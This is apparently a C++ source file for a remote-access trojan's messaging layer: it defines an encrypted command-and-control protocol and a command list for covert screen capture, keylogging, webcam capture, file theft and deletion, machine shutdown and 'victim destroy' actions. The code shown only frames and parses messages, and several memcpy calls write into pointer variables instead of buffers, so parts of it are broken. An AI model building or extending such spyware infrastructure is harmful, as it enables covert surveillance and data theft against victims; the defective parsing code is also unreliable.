#include <bits/stdc++.h>
#include "nlohmann/json.hpp"
using json = nlohmann::json;

enum MessageEnum {
    MessageRawText,
    MessageEnableScreenCap,
    MessageHeartbeatScreenCap,
    MessageDisableScreenCap,
    MessageEnableKeylog,
    MessageHeartbeartKeylog,
    MessageDisableKeylog,
    MessageEnableWebcam,
    MessageDisableWebcam,
    MessageEnableMicro,     //unimplemented
    MessageDisableMicro,    //unimplemented
    MessageListFile,
    MessageGetFile,
    MessageDeleteFile,
    MessageModifyFile,      //unimplemented
    MessageShutdownMachine,
    MessageInvokePowershell,//unimplemented
    MessageInvokeCmd,       //unimplemented
    MessageVictimDestroy1,  //unimplemented
    MessageVictimDestroy2,  
    MessageVictimDestroy3,  //unimplemented
};

class Message {
    public:
    uint16_t commandNumber;
    uint16_t returnCode = 1;
    uint16_t reserved = 0;

    ~Message() {
        delete[] binaryData;
        delete[] jsonData;
    }

    void setJsonData(const json& j) {
        delete[] jsonData;
        std::string jdump = j.dump();
        jsonDataSize = jdump.size(); 
        jsonData = new char[jsonDataSize];
        memcpy(jsonData, jdump.data(), jsonDataSize);
        setSegmentSize();
    }

    char* getJsonData() const {
        return jsonData;
    }

    int getJsonDataSize() const {
        return jsonDataSize;
    }

    void setBinaryData(const char *tbuf, int tsize) {
        delete[] binaryData;
        binaryData = new char[tsize];
        memcpy(binaryData, tbuf, tsize);
        binaryDataSize = tsize;
        setSegmentSize();
    }

    char* getBinaryData() const {
        return binaryData;
    }

    int getBinaryDataSize() const {
        return binaryDataSize;
    }

    int getSegmentSize() const {
        return segmentSize;
    }

    private:
    char magicNumber[4] = {'Z', 'Z', 'T', 'T'};
    int segmentSize;

    char *binaryData = nullptr;
    int binaryDataSize = 0;

    char *jsonData = nullptr;
    uint16_t jsonDataSize = 0;

    int setSegmentSize() {
        return segmentSize = 16 + jsonDataSize + binaryDataSize;
    }
};

namespace JsonDataHelper {
    std::string GetFileName(const Message& msg) {
        std::string optionalData(msg.getJsonData(), msg.getJsonData()+msg.getJsonDataSize());
        std::string filename;
        json jsonData;
        try {
            jsonData = json::parse(optionalData);
            filename = jsonData.at("fileName");
        } catch(const json::parse_error& e) {
            std::cerr << "JSON error: " << e.what() << std::endl;
        }

        return filename;
    }
}

int assembleMessage(const char *bindata, int size, Message& msg, std::string *errorString = nullptr) {
    if (size < 16) {
        if(errorString) *errorString = "Data too smol";
        return 0;
    }

    if (memcmp(bindata, "ZZTT", 4) != 0) {
        if(errorString) *errorString = "Invalid magic number";
        return 0;
    }

    //read segment size
    uint32_t segmentSize;
    memcpy(&segmentSize, bindata + 4, 4);
    if(segmentSize == -1) {
        if(errorString) *errorString = "Call Public key exchange message!";
        return 0;
    }

    // Read command number
    memcpy(&msg.commandNumber, bindata + 8, 2);
    
    // Read return code
    memcpy(&msg.returnCode, bindata + 10, 2);
    
    // Read JSON data size
    uint16_t jsonSize;
    memcpy(&jsonSize, bindata + 12, 2);
    
    // Read reserved field (unused)
    memcpy(&msg.reserved, bindata + 14, 2);
    
    // Verify we have enough data for the JSON part
    if (size < 16 + jsonSize) {
        if(errorString) *errorString = "Message too small for declared JSON data";
        return 0;
    }
    
    // Set JSON data if present
    if(jsonSize > 0) {
        char* jsonData = new char[jsonSize];
        memcpy(jsonData, bindata + 16, jsonSize);
        
        msg.setJsonData(json::parse(std::string(jsonData, jsonData + jsonSize)));
        delete[] jsonData;
    }
    
    // Calculate binary data size and set it if present
    int binarySize = size - 16 - jsonSize;
    if (binarySize > 0) {
        msg.setBinaryData(bindata + 16 + jsonSize, binarySize);
        return 0;
    }
    
    return 1;
}

int prepareMessage(const Message& msg, char*& data, int& dataSize, std::string *errorString = nullptr) {
    dataSize = msg.getSegmentSize();
    char *jsonData = msg.getJsonData();
    char *binaryData = msg.getBinaryData();
    uint16_t jsonSize = msg.getJsonDataSize();
    int binarySize = msg.getBinaryDataSize();
    
    if(dataSize != 16 + jsonSize + binarySize) {
        if(errorString) *errorString = "dataSize != 16 + jsonSize + binarySize";
        dataSize = 0;
        return 0;
    }
    
    data = new char[dataSize];
    memcpy(data, "ZZTT", 4);
    memcpy(data+4, &dataSize, 4);
    memcpy(data+8, &msg.commandNumber, 2);
    memcpy(data+10, &msg.returnCode, 2);
    memcpy(data+12, &jsonSize, 2);
    memcpy(data+14, &msg.reserved, 2);
    memcpy(data+16, jsonData, jsonSize);
    memcpy(data+16+jsonSize, binaryData, binarySize);

    if(errorString) *errorString = "OK";
    return 1;
}

int proceedEncryptedMessage(const char *bindata, int size, std::vector<uint8_t>& fullData, int& lastDataRemainingSize, std::array<uint8_t, 12>& nonce, std::string *errorString = nullptr) {
    if(lastDataRemainingSize == 0) {
        if (memcmp(bindata, "ZZTE", 4) != 0) {
            if(errorString) *errorString = "Invalid magic number";
            return 0;
        }
        int totalDataSize;
        memcpy(&totalDataSize, bindata+4, 4);
        if(totalDataSize == -1) {    //key exchange
            lastDataRemainingSize = 0;
            fullData.assign(32, 0);
            uint8_t *fullDataPtr = fullData.data();
            memcpy(&fullDataPtr, bindata+8, 32);
            return 2;
        } else {
            //new data
            int deliveredDataSize = size-24;
            fullData.assign(deliveredDataSize, 0);
            uint8_t *noncePtr = nonce.data();
            uint8_t *fullDataPtr = fullData.data();
            int reserved;
            memcpy(&totalDataSize, bindata+4, 4);
            memcpy(&noncePtr, bindata+8, 12);
            memcpy(&reserved, bindata+20, 4);
            memcpy(&fullDataPtr, bindata+24, deliveredDataSize);
            lastDataRemainingSize = totalDataSize - deliveredDataSize;
            if(lastDataRemainingSize <= 0) lastDataRemainingSize = 0;
            return 1;
        }
    } else {
        //continue transmission
        int oldFullDataSize = fullData.size();
        fullData.resize(fullData.size() + size, 0);
        uint8_t *fullDataPtr = fullData.data();
        memcpy(fullDataPtr, bindata, size);
        lastDataRemainingSize -= size;
        if(lastDataRemainingSize <= 0) lastDataRemainingSize = 0;
        return 1;
    }
}

/**
 * Message format decrypted:
 * 4 byte magic number: ZZTT
 * 4 byte: total segment size (only use 31bit, positive int)
 * 2 byte: command number
 * 2 byte: return code (for receiving), otherwise 0
 * 2 byte: json data size, including every character
 * 2 byte: unused
 * n byte: json data. Do not null-terminated
 * the rest: binary data
 */

 /**
 * Message format encrypted:
 * 4 byte magic number: ZZTE
 * 4 byte: encrypted data size (only positive int)
 * the rest: entire (Message format decrypted) encrypted data
 * 12 byte: the nonce
 * 4 byte: reserved (should be 0)
 */

 /**
  * Message format key exchange
  * 4 byte magic number: ZZTE
  * 4 byte of FF (=-1)
  * the rest: public key
  */

  /**
   * Idea: 
   * 1. Construct - export Message class to one big binary chunk
   * 2. Encrypt that whole big chunk to EncryptedMessage
   * 2.5. Encrypted message is the TCP "front-end": do the job of splitting the encrypted message
   */